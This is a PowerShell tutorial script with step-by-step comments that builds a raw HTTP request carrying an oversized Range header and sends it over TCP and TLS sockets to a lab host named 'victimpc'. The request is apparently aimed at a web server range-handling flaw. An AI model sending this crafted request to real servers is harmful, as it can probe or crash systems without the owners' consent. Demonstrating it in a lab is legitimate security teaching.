<#
    So let's just try doing a simple webrequest to begin with, as you can see, it works as expected
#>
Invoke-webrequest -Uri http://192.168.40.133

<#
    Perhaps we could just use the headers parameter and specify the range?
#>
Invoke-webrequest -Uri http://192.168.40.133 -Headers @{'Range' = 'bytes=0-18446744073709551615'}

<#
    Unfortunately, we recieve an error. 
    
    The error is telling us that we need to use the appropriate property to adjust the headers, but from invoke-webrequest, 
    there just isn't a way of doing so.

    Well, we know that invoke-webrequest is just using the .net frameworks webrequest object under the covers, so let's just
    use that then!

    So let's create a web request, and just get a response from the server to check it works as we expect.
#>
$WR = [System.Net.WebRequest]::Create('http://192.168.40.133')
$wr.GetResponse()

<#
    And much like before, we have successfully requested the page.

    How about we try changing the range header via the headers property.
#>
$WR.Headers['Range'] = 'bytes=0-18446744073709551615'

<#
    Once again an error, and this one is pretty much like what we saw before.

    Let's try using the Add Range method
#>
$WR.AddRange(0, 18446744073709551615)

<#
    And we get another error. This time, were are getting an error abou the value specified.

    It is too large for an Int32 value. The issue is, the .Net framework has a bunch of rules,
    and we are trying to violate those rules, and it just isn't going to let us. 

    The solution is to work at a lower level, HTTP is a TCP based protocol, instead of using these
    HTTP clients, we need to use TCP connections and speak HTTP ourselves.
#>

#
clear-host

#Create out HTTP request
$HTTPRequest  = "GET / HTTP/1.1`r`n"
$HTTPRequest += "Host: 192.168.40.133`r`n"
$HTTPRequest += "Range: bytes=0-18446744073709551615`r`n"
$HTTPRequest += "Connection: close`r`n" 
$HTTPRequest += "`r`n"

#Create a TCPClient and connect to the specified computer on port 80
$TCPClient = New-Object -TypeName System.Net.Sockets.TcpClient 
$TCPClient.Connect('192.168.40.133', 80)

#Setup the Streams
$TCPStream = $TCPClient.GetStream()
$TCPStreamWriter = New-Object -TypeName System.IO.StreamWriter -ArgumentList $TCPStream
$TCPStreamReader = New-Object -TypeName System.IO.StreamReader -ArgumentList $TCPStream

#Send our request
$TCPStreamWriter.Write($HTTPRequest)
$TCPStreamWriter.Flush()

#Read the response
$HTTPResponse = $TCPStreamReader.ReadToEnd()

# Close the client and stream
$TCPClient.Close()
$TCPStream.Close()

$HTTPResponse


#-----
clear-host

#Create a TCPClient and connect to specified computer on port 443
$TCPClient = New-Object -TypeName System.Net.Sockets.TcpClient 
$TCPClient.Connect('192.168.40.133', 443)

#Setup the Streams
$SSLStream = New-Object -TypeName System.Net.Security.SslStream -ArgumentList ($TCPClient.GetStream())
$SSLStream.AuthenticateAsClient('victimpc')
$TCPStreamWriter = New-Object -TypeName System.IO.StreamWriter -ArgumentList $SSLStream
$TCPStreamReader = New-Object -TypeName System.IO.StreamReader -ArgumentList $SSLStream

#Send our request
$TCPStreamWriter.Write($HTTPRequest)
$TCPStreamWriter.Flush()

#Read the response
$HTTPResponse = $TCPStreamReader.ReadToEnd()

# Close the client and stream
$TCPClient.Close()
$SSLStream.Close()

$HTTPResponse
